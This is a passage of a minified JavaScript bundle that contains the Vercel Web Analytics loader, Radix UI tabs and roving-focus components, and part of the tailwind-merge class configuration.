    },
    Mt = ke,
    Zv = "@vercel/analytics",
    qv = "1.3.1",
    eg = () => {
        window.va || (window.va = function (...t) {
            (window.vaq = window.vaq || []).push(t)
        })
    };

function Pf() {
    return typeof window < "u"
}

function Tf() {
    try { } catch { }
    return "production"
}

function tg(e = "auto") {
    window.vam = "auto" !== e ? e : Tf()
}

function ng() {
    return (Pf() ? window.vam : Tf()) || "production"
}

function Si() {
    return "development" === ng()
}
var rg = "https://va.vercel-scripts.com/v1/script.debug.js",
    og = "/_vercel/insights/script.js";

function lg(e = {
    debug: !0
}) {
    var t;
    if (!Pf()) return;
    tg(e.mode), eg(), e.beforeSend && (null == (t = window.va) || t.call(window, "beforeSend", e.beforeSend));
    const n = e.scriptSrc || (Si() ? rg : og);
    if (document.head.querySelector(`script[src*="${n}"]`)) return;
    const r = document.createElement("script");
    r.src = n, r.defer = !0, r.dataset.sdkn = Zv + (e.framework ? `/${e.framework}` : ""), r.dataset.sdkv = qv, e.disableAutoTrack && (r.dataset.disableAutoTrack = "1"), e.endpoint && (r.dataset.endpoint = e.endpoint), e.dsn && (r.dataset.dsn = e.dsn), r.onerror = () => {
        const o = Si() ? "Please check if any ad blockers are enabled and try again." : "Be sure to enable Web Analytics for your project and deploy again. See https://vercel.com/docs/analytics/quickstart for more information.";
        console.log(`[Vercel Web Analytics] Failed to load script from ${n}. ${o}`)
    }, Si() && !1 === e.debug && (r.dataset.debug = "false"), document.head.appendChild(r)
}

function ig({
    route: e,
    path: t
}) {
    var n;
    null == (n = window.va) || n.call(window, "pageview", {
        route: e,
        path: t
    })
}

function sg(e) {
    return x.useEffect((() => {
        lg({
            framework: e.framework || "react",
            ...void 0 !== e.route && {
                disableAutoTrack: !0
            },
            ...e
        })
    }), []), x.useEffect((() => {
        e.route && e.path && ig({
            route: e.route,
            path: e.path
        })
    }), [e.route, e.path]), null
}

function it(e, t, {
    checkForDefaultPrevented: n = !0
} = {}) {
    return function (o) {
        if (null == e || e(o), !1 === n || !o.defaultPrevented) return null == t ? void 0 : t(o)
    }
}

function br(e, t = []) {
    let n = [];
    const o = () => {
        const l = n.map((i => x.createContext(i)));
        return function (s) {
            const u = (null == s ? void 0 : s[e]) || l;
            return x.useMemo((() => ({
                [`__scope${e}`]: {
                    ...s,
                    [e]: u
                }
            })), [s, u])
        }
    };
    return o.scopeName = e, [function r(l, i) {
        const s = x.createContext(i),
            u = n.length;

        function a(p) {
            const {
                scope: m,
                children: g,
                ...w
            } = p, y = (null == m ? void 0 : m[e][u]) || s, S = x.useMemo((() => w), Object.values(w));
            return v.jsx(y.Provider, {
                value: S,
                children: g
            })
        }
        return n = [...n, i], a.displayName = l + "Provider", [a, function c(p, m) {
            const g = (null == m ? void 0 : m[e][u]) || s,
                w = x.useContext(g);
            if (w) return w;
            if (void 0 !== i) return i;
            throw new Error(`\`${p}\` must be used within \`${l}\``)
        }]
    }, ug(o, ...t)]
}

function ug(...e) {
    const t = e[0];
    if (1 === e.length) return t;
    const n = () => {
        const r = e.map((o => ({
            useScope: o(),
            scopeName: o.scopeName
        })));
        return function (l) {
            const i = r.reduce(((s, {
                useScope: u,
                scopeName: a
            }) => ({
                ...s,
                ...u(l)[`__scope${a}`]
            })), {});
            return x.useMemo((() => ({
                [`__scope${t.scopeName}`]: i
            })), [i])
        }
    };
    return n.scopeName = t.scopeName, n
}

function ag(e, t) {
    "function" == typeof e ? e(t) : null != e && (e.current = t)
}

function If(...e) {
    return t => e.forEach((n => ag(n, t)))
}

function dl(...e) {
    return x.useCallback(If(...e), e)
}
var jr = x.forwardRef(((e, t) => {
    const {
        children: n,
        ...r
    } = e, o = x.Children.toArray(n), l = o.find(dg);
    if (l) {
        const i = l.props.children,
            s = o.map((u => u === l ? x.Children.count(i) > 1 ? x.Children.only(null) : x.isValidElement(i) ? i.props.children : null : u));
        return v.jsx(Es, {
            ...r,
            ref: t,
            children: x.isValidElement(i) ? x.cloneElement(i, void 0, s) : null
        })
    }
    return v.jsx(Es, {
        ...r,
        ref: t,
        children: n
    })
}));
jr.displayName = "Slot";
var Es = x.forwardRef(((e, t) => {
    const {
        children: n,
        ...r
    } = e;
    if (x.isValidElement(n)) {
        const o = pg(n);
        return x.cloneElement(n, {
            ...fg(r, n.props),
            ref: t ? If(t, o) : o
        })
    }
    return x.Children.count(n) > 1 ? x.Children.only(null) : null
}));
Es.displayName = "SlotClone";
var cg = ({
    children: e
}) => v.jsx(v.Fragment, {
    children: e
});

function dg(e) {
    return x.isValidElement(e) && e.type === cg
}

function fg(e, t) {
    const n = {
        ...t
    };
    for (const r in t) {
        const o = e[r],
            l = t[r];
        /^on[A-Z]/.test(r) ? o && l ? n[r] = (...s) => {
            l(...s), o(...s)
        } : o && (n[r] = o) : "style" === r ? n[r] = {
            ...o,
            ...l
        } : "className" === r && (n[r] = [o, l].filter(Boolean).join(" "))
    }
    return {
        ...e,
        ...n
    }
}

function pg(e) {
    var r, o;
    let t = null == (r = Object.getOwnPropertyDescriptor(e.props, "ref")) ? void 0 : r.get,
        n = t && "isReactWarning" in t && t.isReactWarning;
    return n ? e.ref : (t = null == (o = Object.getOwnPropertyDescriptor(e, "ref")) ? void 0 : o.get, n = t && "isReactWarning" in t && t.isReactWarning, n ? e.props.ref : e.props.ref || e.ref)
}

function mg(e) {
    const t = e + "CollectionProvider",
        [n, r] = br(t),
        [o, l] = n(t, {
            collectionRef: {
                current: null
            },
            itemMap: new Map
        }),
        i = g => {
            const {
                scope: w,
                children: y
            } = g, S = Ye.useRef(null), f = Ye.useRef(new Map).current;
            return v.jsx(o, {
                scope: w,
                itemMap: f,
                collectionRef: S,
                children: y
            })
        };
    i.displayName = t;
    const s = e + "CollectionSlot",
        u = Ye.forwardRef(((g, w) => {
            const {
                scope: y,
                children: S
            } = g, d = dl(w, l(s, y).collectionRef);
            return v.jsx(jr, {
                ref: d,
                children: S
            })
        }));
    u.displayName = s;
    const a = e + "CollectionItemSlot",
        c = "data-radix-collection-item",
        p = Ye.forwardRef(((g, w) => {
            const {
                scope: y,
                children: S,
                ...f
            } = g, d = Ye.useRef(null), h = dl(w, d), _ = l(a, y);
            return Ye.useEffect((() => (_.itemMap.set(d, {
                ref: d,
                ...f
            }), () => {
                _.itemMap.delete(d)
            }))), v.jsx(jr, {
                [c]: "",
                ref: h,
                children: S
            })
        }));
    return p.displayName = a, [{
        Provider: i,
        Slot: u,
        ItemSlot: p
    }, function m(g) {
        const w = l(e + "CollectionConsumer", g);
        return Ye.useCallback((() => {
            const S = w.collectionRef.current;
            if (!S) return [];
            const f = Array.from(S.querySelectorAll(`[${c}]`));
            return Array.from(w.itemMap.values()).sort(((_, k) => f.indexOf(_.ref.current) - f.indexOf(k.ref.current)))
        }), [w.collectionRef, w.itemMap])
    }, r]
}
var Or = null != globalThis && globalThis.document ? x.useLayoutEffect : () => { },
    hg = Jp.useId || (() => { }),
    vg = 0;

function Rf(e) {
    const [t, n] = x.useState(hg());
    return Or((() => {
        e || n((r => r ?? String(vg++)))
    }), [e]), e || (t ? `radix-${t}` : "")
}
var gg = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "span", "svg", "ul"],
    Be = gg.reduce(((e, t) => {
        const n = x.forwardRef(((r, o) => {
            const {
                asChild: l,
                ...i
            } = r, s = l ? jr : t;
            return typeof window < "u" && (window[Symbol.for("radix-ui")] = !0), v.jsx(s, {
                ...i,
                ref: o
            })
        }));
        return n.displayName = `Primitive.${t}`, {
            ...e,
            [t]: n
        }
    }), {});

function zl(e) {
    const t = x.useRef(e);
    return x.useEffect((() => {
        t.current = e
    })), x.useMemo((() => (...n) => {
        var r;
        return null == (r = t.current) ? void 0 : r.call(t, ...n)
    }), [])
}

function jf({
    prop: e,
    defaultProp: t,
    onChange: n = (() => { })
}) {
    const [r, o] = yg({
        defaultProp: t,
        onChange: n
    }), l = void 0 !== e, i = l ? e : r, s = zl(n);
    return [i, x.useCallback((a => {
        if (l) {
            const p = "function" == typeof a ? a(e) : a;
            p !== e && s(p)
        } else o(a)
    }), [l, e, o, s])]
}

function yg({
    defaultProp: e,
    onChange: t
}) {
    const n = x.useState(e),
        [r] = n,
        o = x.useRef(r),
        l = zl(t);
    return x.useEffect((() => {
        o.current !== r && (l(r), o.current = r)
    }), [r, o, l]), n
}
var wg = x.createContext(void 0);

function Of(e) {
    const t = x.useContext(wg);
    return e || t || "ltr"
}
var _i = "rovingFocusGroup.onEntryFocus",
    xg = {
        bubbles: !1,
        cancelable: !0
    },
    Ll = "RovingFocusGroup",
    [ks, zf, Sg] = mg(Ll),
    [_g, Lf] = br(Ll, [Sg]),
    [Eg, kg] = _g(Ll),
    Mf = x.forwardRef(((e, t) => v.jsx(ks.Provider, {
        scope: e.__scopeRovingFocusGroup,
        children: v.jsx(ks.Slot, {
            scope: e.__scopeRovingFocusGroup,
            children: v.jsx(Cg, {
                ...e,
                ref: t
            })
        })
    })));
Mf.displayName = Ll;
var Cg = x.forwardRef(((e, t) => {
    const {
        __scopeRovingFocusGroup: n,
        orientation: r,
        loop: o = !1,
        dir: l,
        currentTabStopId: i,
        defaultCurrentTabStopId: s,
        onCurrentTabStopIdChange: u,
        onEntryFocus: a,
        preventScrollOnEntryFocus: c = !1,
        ...p
    } = e, m = x.useRef(null), g = dl(t, m), w = Of(l), [y = null, S] = jf({
        prop: i,
        defaultProp: s,
        onChange: u
    }), [f, d] = x.useState(!1), h = zl(a), _ = zf(n), k = x.useRef(!1), [I, T] = x.useState(0);
    return x.useEffect((() => {
        const C = m.current;
        if (C) return C.addEventListener(_i, h), () => C.removeEventListener(_i, h)
    }), [h]), v.jsx(Eg, {
        scope: n,
        orientation: r,
        dir: w,
        loop: o,
        currentTabStopId: y,
        onItemFocus: x.useCallback((C => S(C)), [S]),
        onItemShiftTab: x.useCallback((() => d(!0)), []),
        onFocusableItemAdd: x.useCallback((() => T((C => C + 1))), []),
        onFocusableItemRemove: x.useCallback((() => T((C => C - 1))), []),
        children: v.jsx(Be.div, {
            tabIndex: f || 0 === I ? -1 : 0,
            "data-orientation": r,
            ...p,
            ref: g,
            style: {
                outline: "none",
                ...e.style
            },
            onMouseDown: it(e.onMouseDown, (() => {
                k.current = !0
            })),
            onFocus: it(e.onFocus, (C => {
                const D = !k.current;
                if (C.target === C.currentTarget && D && !f) {
                    const j = new CustomEvent(_i, xg);
                    if (C.currentTarget.dispatchEvent(j), !j.defaultPrevented) {
                        const Z = _().filter((ie => ie.focusable));
                        Df([Z.find((ie => ie.active)), Z.find((ie => ie.id === y)), ...Z].filter(Boolean).map((ie => ie.ref.current)), c)
                    }
                }
                k.current = !1
            })),
            onBlur: it(e.onBlur, (() => d(!1)))
        })
    })
})),
    Af = "RovingFocusGroupItem",
    $f = x.forwardRef(((e, t) => {
        const {
            __scopeRovingFocusGroup: n,
            focusable: r = !0,
            active: o = !1,
            tabStopId: l,
            ...i
        } = e, s = Rf(), u = l || s, a = kg(Af, n), c = a.currentTabStopId === u, p = zf(n), {
            onFocusableItemAdd: m,
            onFocusableItemRemove: g
        } = a;
        return x.useEffect((() => {
            if (r) return m(), () => g()
        }), [r, m, g]), v.jsx(ks.ItemSlot, {
            scope: n,
            id: u,
            focusable: r,
            active: o,
            children: v.jsx(Be.span, {
                tabIndex: c ? 0 : -1,
                "data-orientation": a.orientation,
                ...i,
                ref: t,
                onMouseDown: it(e.onMouseDown, (w => {
                    r ? a.onItemFocus(u) : w.preventDefault()
                })),
                onFocus: it(e.onFocus, (() => a.onItemFocus(u))),
                onKeyDown: it(e.onKeyDown, (w => {
                    if ("Tab" === w.key && w.shiftKey) return void a.onItemShiftTab();
                    if (w.target !== w.currentTarget) return;
                    const y = Tg(w, a.orientation, a.dir);
                    if (void 0 !== y) {
                        if (w.metaKey || w.ctrlKey || w.altKey || w.shiftKey) return;
                        w.preventDefault();
                        let f = p().filter((d => d.focusable)).map((d => d.ref.current));
                        if ("last" === y) f.reverse();
                        else if ("prev" === y || "next" === y) {
                            "prev" === y && f.reverse();
                            const d = f.indexOf(w.currentTarget);
                            f = a.loop ? Ig(f, d + 1) : f.slice(d + 1)
                        }
                        setTimeout((() => Df(f)))
                    }
                }))
            })
        })
    }));
$f.displayName = Af;
var Ng = {
    ArrowLeft: "prev",
    ArrowUp: "prev",
    ArrowRight: "next",
    ArrowDown: "next",
    PageUp: "first",
    Home: "first",
    PageDown: "last",
    End: "last"
};

function Pg(e, t) {
    return "rtl" !== t ? e : "ArrowLeft" === e ? "ArrowRight" : "ArrowRight" === e ? "ArrowLeft" : e
}

function Tg(e, t, n) {
    const r = Pg(e.key, n);
    if (!("vertical" === t && ["ArrowLeft", "ArrowRight"].includes(r) || "horizontal" === t && ["ArrowUp", "ArrowDown"].includes(r))) return Ng[r]
}

function Df(e, t = !1) {
    const n = document.activeElement;
    for (const r of e)
        if (r === n || (r.focus({
            preventScroll: t
        }), document.activeElement !== n)) return
}

function Ig(e, t) {
    return e.map(((n, r) => e[(t + r) % e.length]))
}
var Rg = Mf,
    jg = $f;

function Og(e, t) {
    return x.useReducer(((n, r) => t[n][r] ?? n), e)
}
var Ff = e => {
    const {
        present: t,
        children: n
    } = e, r = zg(t), o = "function" == typeof n ? n({
        present: r.isPresent
    }) : x.Children.only(n), l = dl(r.ref, Lg(o));
    return "function" == typeof n || r.isPresent ? x.cloneElement(o, {
        ref: l
    }) : null
};

function zg(e) {
    const [t, n] = x.useState(), r = x.useRef({}), o = x.useRef(e), l = x.useRef("none"), i = e ? "mounted" : "unmounted", [s, u] = Og(i, {
        mounted: {
            UNMOUNT: "unmounted",
            ANIMATION_OUT: "unmountSuspended"
        },
        unmountSuspended: {
            MOUNT: "mounted",
            ANIMATION_END: "unmounted"
        },
        unmounted: {
            MOUNT: "mounted"
        }
    });
    return x.useEffect((() => {
        const a = go(r.current);
        l.current = "mounted" === s ? a : "none"
    }), [s]), Or((() => {
        const a = r.current,
            c = o.current;
        if (c !== e) {
            const m = l.current,
                g = go(a);
            e ? u("MOUNT") : "none" === g || "none" === (null == a ? void 0 : a.display) ? u("UNMOUNT") : u(c && m !== g ? "ANIMATION_OUT" : "UNMOUNT"), o.current = e
        }
    }), [e, u]), Or((() => {
        if (t) {
            const a = p => {
                const g = go(r.current).includes(p.animationName);
                p.target === t && g && Ef.flushSync((() => u("ANIMATION_END")))
            },
                c = p => {
                    p.target === t && (l.current = go(r.current))
                };
            return t.addEventListener("animationstart", c), t.addEventListener("animationcancel", a), t.addEventListener("animationend", a), () => {
                t.removeEventListener("animationstart", c), t.removeEventListener("animationcancel", a), t.removeEventListener("animationend", a)
            }
        }
        u("ANIMATION_END")
    }), [t, u]), {
        isPresent: ["mounted", "unmountSuspended"].includes(s),
        ref: x.useCallback((a => {
            a && (r.current = getComputedStyle(a)), n(a)
        }), [])
    }
}

function go(e) {
    return (null == e ? void 0 : e.animationName) || "none"
}

function Lg(e) {
    var r, o;
    let t = null == (r = Object.getOwnPropertyDescriptor(e.props, "ref")) ? void 0 : r.get,
        n = t && "isReactWarning" in t && t.isReactWarning;
    return n ? e.ref : (t = null == (o = Object.getOwnPropertyDescriptor(e, "ref")) ? void 0 : o.get, n = t && "isReactWarning" in t && t.isReactWarning, n ? e.props.ref : e.props.ref || e.ref)
}
Ff.displayName = "Presence";
var Tu = "Tabs",
    [Mg, K0] = br(Tu, [Lf]),
    Vf = Lf(),
    [Ag, Iu] = Mg(Tu),
    Uf = x.forwardRef(((e, t) => {
        const {
            __scopeTabs: n,
            value: r,
            onValueChange: o,
            defaultValue: l,
            orientation: i = "horizontal",
            dir: s,
            activationMode: u = "automatic",
            ...a
        } = e, c = Of(s), [p, m] = jf({
            prop: r,
            onChange: o,
            defaultProp: l
        });
        return v.jsx(Ag, {
            scope: n,
            baseId: Rf(),
            value: p,
            onValueChange: m,
            orientation: i,
            dir: c,
            activationMode: u,
            children: v.jsx(Be.div, {
                dir: c,
                "data-orientation": i,
                ...a,
                ref: t
            })
        })
    }));
Uf.displayName = Tu;
var bf = "TabsList",
    Wf = x.forwardRef(((e, t) => {
        const {
            __scopeTabs: n,
            loop: r = !0,
            ...o
        } = e, l = Iu(bf, n), i = Vf(n);
        return v.jsx(Rg, {
            asChild: !0,
            ...i,
            orientation: l.orientation,
            dir: l.dir,
            loop: r,
            children: v.jsx(Be.div, {
                role: "tablist",
                "aria-orientation": l.orientation,
                ...o,
                ref: t
            })
        })
    }));
Wf.displayName = bf;
var Hf = "TabsTrigger",
    Bf = x.forwardRef(((e, t) => {
        const {
            __scopeTabs: n,
            value: r,
            disabled: o = !1,
            ...l
        } = e, i = Iu(Hf, n), s = Vf(n), u = Qf(i.baseId, r), a = Yf(i.baseId, r), c = r === i.value;
        return v.jsx(jg, {
            asChild: !0,
            ...s,
            focusable: !o,
            active: c,
            children: v.jsx(Be.button, {
                type: "button",
                role: "tab",
                "aria-selected": c,
                "aria-controls": a,
                "data-state": c ? "active" : "inactive",
                "data-disabled": o ? "" : void 0,
                disabled: o,
                id: u,
                ...l,
                ref: t,
                onMouseDown: it(e.onMouseDown, (p => {
                    o || 0 !== p.button || !1 !== p.ctrlKey ? p.preventDefault() : i.onValueChange(r)
                })),
                onKeyDown: it(e.onKeyDown, (p => {
                    [" ", "Enter"].includes(p.key) && i.onValueChange(r)
                })),
                onFocus: it(e.onFocus, (() => {
                    const p = "manual" !== i.activationMode;
                    !c && !o && p && i.onValueChange(r)
                }))
            })
        }
        )
    }));
Bf.displayName = Hf;
var Gf = "TabsContent",
    Kf = x.forwardRef(((e, t) => {
        const {
            __scopeTabs: n,
            value: r,
            forceMount: o,
            children: l,
            ...i
        } = e, s = Iu(Gf, n), u = Qf(s.baseId, r), a = Yf(s.baseId, r), c = r === s.value, p = x.useRef(c);
        return x.useEffect((() => {
            const m = requestAnimationFrame((() => p.current = !1));
            return () => cancelAnimationFrame(m)
        }), []), v.jsx(Ff, {
            present: o || c,
            children: ({
                present: m
            }) => v.jsx(Be.div, {
                "data-state": c ? "active" : "inactive",
                "data-orientation": s.orientation,
                role: "tabpanel",
                "aria-labelledby": u,
                hidden: !m,
                id: a,
                tabIndex: 0,
                ...i,
                ref: t,
                style: {
                    ...e.style,
                    animationDuration: p.current ? "0s" : void 0
                },
                children: m && l
            })
        })
    }));

function Qf(e, t) {
    return `${e}-trigger-${t}`
}

function Yf(e, t) {
    return `${e}-content-${t}`
}
Kf.displayName = Gf;
var $g = Uf,
    Xf = Wf,
    Jf = Bf,
    Zf = Kf;

function qf(e) {
    var t, n, r = "";
    if ("string" == typeof e || "number" == typeof e) r += e;
    else if ("object" == typeof e)
        if (Array.isArray(e)) {
            var o = e.length;
            for (t = 0; t < o; t++) e[t] && (n = qf(e[t])) && (r && (r += " "), r += n)
        } else
            for (n in e) e[n] && (r && (r += " "), r += n);
    return r
}

function Dg() {
    for (var e, t, n = 0, r = "", o = arguments.length; n < o; n++)(e = arguments[n]) && (t = qf(e)) && (r && (r += " "), r += t);
    return r
}
const Ru = "-";

function Fg(e) {
    const t = Ug(e),
        {
            conflictingClassGroups: n,
            conflictingClassGroupModifiers: r
        } = e;
    return {
        getClassGroupId: function o(i) {
            const s = i.split(Ru);
            return "" === s[0] && 1 !== s.length && s.shift(), ep(s, t) || Vg(i)
        },
        getConflictingClassGroupIds: function l(i, s) {
            const u = n[i] || [];
            return s && r[i] ? [...u, ...r[i]] : u
        }
    }
}

function ep(e, t) {
    var i;
    if (0 === e.length) return t.classGroupId;
    const n = e[0],
        r = t.nextPart.get(n),
        o = r ? ep(e.slice(1), r) : void 0;
    if (o) return o;
    if (0 === t.validators.length) return;
    const l = e.join(Ru);
    return null == (i = t.validators.find((({
        validator: s
    }) => s(l)))) ? void 0 : i.classGroupId
}
const Qa = /^\[(.+)\]$/;

function Vg(e) {
    if (Qa.test(e)) {
        const t = Qa.exec(e)[1],
            n = null == t ? void 0 : t.substring(0, t.indexOf(":"));
        if (n) return "arbitrary.." + n
    }
}

function Ug(e) {
    const {
        theme: t,
        prefix: n
    } = e, r = {
        nextPart: new Map,
        validators: []
    };
    return Wg(Object.entries(e.classGroups), n).forEach((([l, i]) => {
        Cs(i, r, l, t)
    })), r
}

function Cs(e, t, n, r) {
    e.forEach((o => {
        if ("string" != typeof o) {
            if ("function" == typeof o) return bg(o) ? void Cs(o(r), t, n, r) : void t.validators.push({
                validator: o,
                classGroupId: n
            });
            Object.entries(o).forEach((([l, i]) => {
                Cs(i, Ya(t, l), n, r)
            }))
        } else {
            ("" === o ? t : Ya(t, o)).classGroupId = n
        }
    }))
}

function Ya(e, t) {
    let n = e;
    return t.split(Ru).forEach((r => {
        n.nextPart.has(r) || n.nextPart.set(r, {
            nextPart: new Map,
            validators: []
        }), n = n.nextPart.get(r)
    })), n
}

function bg(e) {
    return e.isThemeGetter
}

function Wg(e, t) {
    return t ? e.map((([n, r]) => [n, r.map((l => "string" == typeof l ? t + l : "object" == typeof l ? Object.fromEntries(Object.entries(l).map((([i, s]) => [t + i, s]))) : l))])) : e
}

function Hg(e) {
    if (e < 1) return {
        get: () => { },
        set: () => { }
    };
    let t = 0,
        n = new Map,
        r = new Map;

    function o(l, i) {
        n.set(l, i), t++, t > e && (t = 0, r = n, n = new Map)
    }
    return {
        get(l) {
            let i = n.get(l);
            return void 0 !== i ? i : void 0 !== (i = r.get(l)) ? (o(l, i), i) : void 0
        },
        set(l, i) {
            n.has(l) ? n.set(l, i) : o(l, i)
        }
    }
}
const tp = "!";

function Bg(e) {
    const {
        separator: t,
        experimentalParseClassName: n
    } = e, r = 1 === t.length, o = t[0], l = t.length;

    function i(s) {
        const u = [];
        let p, a = 0,
            c = 0;
        for (let S = 0; S < s.length; S++) {
            let f = s[S];
            if (0 === a) {
                if (f === o && (r || s.slice(S, S + l) === t)) {
                    u.push(s.slice(c, S)), c = S + l;
                    continue
                }
                if ("/" === f) {
                    p = S;
                    continue
                }
            }
            "[" === f ? a++ : "]" === f && a--
        }
        const m = 0 === u.length ? s : s.substring(c),
            g = m.startsWith(tp);
        return {
            modifiers: u,
            hasImportantModifier: g,
            baseClassName: g ? m.substring(1) : m,
            maybePostfixModifierPosition: p && p > c ? p - c : void 0
        }
    }
    return n ? function (u) {
        return n({
            className: u,
            parseClassName: i
        })
    } : i
}

function Gg(e) {
    if (e.length <= 1) return e;
    const t = [];
    let n = [];
    return e.forEach((r => {
        "[" === r[0] ? (t.push(...n.sort(), r), n = []) : n.push(r)
    })), t.push(...n.sort()), t
}

function Kg(e) {
    return {
        cache: Hg(e.cacheSize),
        parseClassName: Bg(e),
        ...Fg(e)
    }
}
const Qg = /\s+/;

function Yg(e, t) {
    const {
        parseClassName: n,
        getClassGroupId: r,
        getConflictingClassGroupIds: o
    } = t, l = new Set;
    return e.trim().split(Qg).map((i => {
        const {
            modifiers: s,
            hasImportantModifier: u,
            baseClassName: a,
            maybePostfixModifierPosition: c
        } = n(i);
        let p = !!c,
            m = r(p ? a.substring(0, c) : a);
        if (!m) {
            if (!p) return {
                isTailwindClass: !1,
                originalClassName: i
            };
            if (m = r(a), !m) return {
                isTailwindClass: !1,
                originalClassName: i
            };
            p = !1
        }
        const g = Gg(s).join(":");
        return {
            isTailwindClass: !0,
            modifierId: u ? g + tp : g,
            classGroupId: m,
            originalClassName: i,
            hasPostfixModifier: p
        }
    })).reverse().filter((i => {
        if (!i.isTailwindClass) return !0;
        const {
            modifierId: s,
            classGroupId: u,
            hasPostfixModifier: a
        } = i, c = s + u;
        return !l.has(c) && (l.add(c), o(u, a).forEach((p => l.add(s + p))), !0)
    })).reverse().map((i => i.originalClassName)).join(" ")
}

function Xg() {
    let t, n, e = 0,
        r = "";
    for (; e < arguments.length;)(t = arguments[e++]) && (n = np(t)) && (r && (r += " "), r += n);
    return r
}

function np(e) {
    if ("string" == typeof e) return e;
    let t, n = "";
    for (let r = 0; r < e.length; r++) e[r] && (t = np(e[r])) && (n && (n += " "), n += t);
    return n
}

function Jg(e, ...t) {
    let n, r, o, l = function i(u) {
        const a = t.reduce(((c, p) => p(c)), e());
        return n = Kg(a), r = n.cache.get, o = n.cache.set, l = s, s(u)
    };

    function s(u) {
        const a = r(u);
        if (a) return a;
        const c = Yg(u, n);
        return o(u, c), c
    }
    return function () {
        return l(Xg.apply(null, arguments))
    }
}

function U(e) {
    const t = n => n[e] || [];
    return t.isThemeGetter = !0, t
}
const rp = /^\[(?:([a-z-]+):)?(.+)\]$/i,
    Zg = /^\d+\/\d+$/,
    qg = new Set(["px", "full", "screen"]),
    ey = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,
    ty = /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,
    ny = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/,
    ry = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,
    oy = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/;

function et(e) {
    return Qt(e) || qg.has(e) || Zg.test(e)
}

function vt(e) {
    return bn(e, "length", fy)
}

function Qt(e) {
    return !!e && !Number.isNaN(Number(e))
}

function yo(e) {
    return bn(e, "number", Qt)
}

function Jn(e) {
    return !!e && Number.isInteger(Number(e))
}

function ly(e) {
    return e.endsWith("%") && Qt(e.slice(0, -1))
}

function z(e) {
    return rp.test(e)
}

function gt(e) {
    return ey.test(e)
}
const iy = new Set(["length", "size", "percentage"]);

function sy(e) {
    return bn(e, iy, op)
}

function uy(e) {
    return bn(e, "position", op)
}
const ay = new Set(["image", "url"]);

function cy(e) {
    return bn(e, ay, my)
}

function dy(e) {
    return bn(e, "", py)
}

function Zn() {
    return !0
}

function bn(e, t, n) {
    const r = rp.exec(e);
    return !!r && (r[1] ? "string" == typeof t ? r[1] === t : t.has(r[1]) : n(r[2]))
}

function fy(e) {
    return ty.test(e) && !ny.test(e)
}

function op() {
    return !1
}

function py(e) {
    return ry.test(e)
}

function my(e) {
    return oy.test(e)
}

function hy() {
    const e = U("colors"),
        t = U("spacing"),
        n = U("blur"),
        r = U("brightness"),
        o = U("borderColor"),
        l = U("borderRadius"),
        i = U("borderSpacing"),
        s = U("borderWidth"),
        u = U("contrast"),
        a = U("grayscale"),
        c = U("hueRotate"),
        p = U("invert"),
        m = U("gap"),
        g = U("gradientColorStops"),
        w = U("gradientColorStopPositions"),
        y = U("inset"),
        S = U("margin"),
        f = U("opacity"),
        d = U("padding"),
        h = U("saturate"),
        _ = U("scale"),
        k = U("sepia"),
        I = U("skew"),
        T = U("space"),
        C = U("translate"),
        Z = () => ["auto", z, t],
        A = () => [z, t],
        Ge = () => ["", et, vt],
        mt = () => ["auto", Qt, z],
        R = () => ["", "0", z],
        F = () => [Qt, yo],
        B = () => [Qt, z];
    return {
        cacheSize: 500,
        separator: ":",
        theme: {
            colors: [Zn],
            spacing: [et, vt],
            blur: ["none", "", gt, z],
            brightness: F(),
            borderColor: [e],
            borderRadius: ["none", "", "full", gt, z],
            borderSpacing: A(),
            borderWidth: Ge(),
            contrast: F(),
            grayscale: R(),
            hueRotate: B(),
            invert: R(),
            gap: A(),
            gradientColorStops: [e],
            gradientColorStopPositions: [ly, vt],
            inset: Z(),
            margin: Z(),
            opacity: F(),
            padding: A(),
            saturate: F(),
            scale: F(),
            sepia: R(),
            skew: B(),
            space: A(),
            translate: A()
        },
        classGroups: {
            aspect: [{
                aspect: ["auto", "square", "video", z]
            }],
            container: ["container"],
            columns: [{
                columns: [gt]
            }],
            "break-after": [{
                "break-after": ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"]
            }],
            "break-before": [{
                "break-before": ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"]
            }],
            "break-inside": [{
                "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"]
            }],
            "box-decoration": [{
                "box-decoration": ["slice", "clone"]
            }],
            box: [{
                box: ["border", "content"]
            }],
            display: ["block", "inline-block", "inline", "flex", "inline-flex", "table", "inline-table", "table-caption", "table-cell", "table-column", "table-column-group", "table-footer-group", "table-header-group", "table-row-group", "table-row", "flow-root", "grid", "inline-grid", "contents", "list-item", "hidden"],
            float: [{
                float: ["right", "left", "none", "start", "end"]
            }],
            clear: [{
                clear: ["left", "right", "both", "none", "start", "end"]
            }],
            isolation: ["isolate", "isolation-auto"],
            "object-fit": [{
                object: ["contain", "cover", "fill", "none", "scale-down"]
            }],
            "object-position": [{
                object: ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top", z]
            }],
            overflow: [{
                overflow: ["auto", "hidden", "clip", "visible", "scroll"]
            }],
            "overflow-x": [{
                "overflow-x": ["auto", "hidden", "clip", "visible", "scroll"]
            }],
            "overflow-y": [{
                "overflow-y": ["auto", "hidden", "clip", "visible", "scroll"]
            }],
            overscroll: [{
                overscroll: ["auto", "contain", "none"]
            }],
            "overscroll-x": [{
                "overscroll-x": ["auto", "contain", "none"]
            }],
            "overscroll-y": [{
                "overscroll-y": ["auto", "contain", "none"]
            }],
            position: ["static", "fixed", "absolute", "relative", "sticky"],
            inset: [{
                inset: [y]
            }],
            "inset-x": [{
                "inset-x": [y]
            }],
            "inset-y": [{
                "inset-y": [y]
            }],
            start: [{
                start: [y]
            }],
            end: [{
                end: [y]
            }],
            top: [{
                top: [y]
            }],
            right: [{
                right: [y]
            }],
            bottom: [{
                bottom: [y]
            }],
            left: [{
                left: [y]
            }],
            visibility: ["visible", "invisible", "collapse"],
            z: [{
                z: ["auto", Jn, z]
            }],
            basis: [{
                basis: Z()
            }],
